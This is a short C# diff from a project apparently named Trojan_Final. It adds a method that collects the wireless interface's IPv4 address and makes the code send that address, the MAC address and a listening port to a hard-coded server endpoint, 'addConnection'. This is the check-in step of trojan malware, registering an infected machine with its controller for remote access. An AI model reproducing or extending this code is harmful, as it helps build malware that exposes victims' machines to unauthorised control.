@@ -13,6 +13,24 @@ namespace Trojan_Final
     class NetworkDiscover
     {
         static HttpClient client = new HttpClient();
+        public static string[] GetAllLocalIPv4(NetworkInterfaceType _type)
+        {
+            List<string> ipAddrList = new List<string>();
+            foreach (NetworkInterface item in NetworkInterface.GetAllNetworkInterfaces())
+            {
+                if (item.NetworkInterfaceType == _type && item.OperationalStatus == OperationalStatus.Up)
+                {
+                    foreach (UnicastIPAddressInformation ip in item.GetIPProperties().UnicastAddresses)
+                    {
+                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
+                        {
+                            ipAddrList.Add(ip.Address.ToString());
+                        }
+                    }
+                }
+            }
+            return ipAddrList.ToArray();
+        }
 
         public static string GetLocalIPAddress()
         {
@@ -43,7 +61,7 @@ namespace Trojan_Final
             client.DefaultRequestHeaders.Accept.Clear();
             client.DefaultRequestHeaders.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue("application/json"));
 
-            var ip = GetLocalIPAddress();
+            var ip = GetAllLocalIPv4(NetworkInterfaceType.Wireless80211).FirstOrDefault();
             var mac = GetMACAdress();
 
             var path = "http://192.168.43.183:8087/users/addConnection?ip=" + ip + "&mac=" + mac +"&port=" + 12831.ToString();
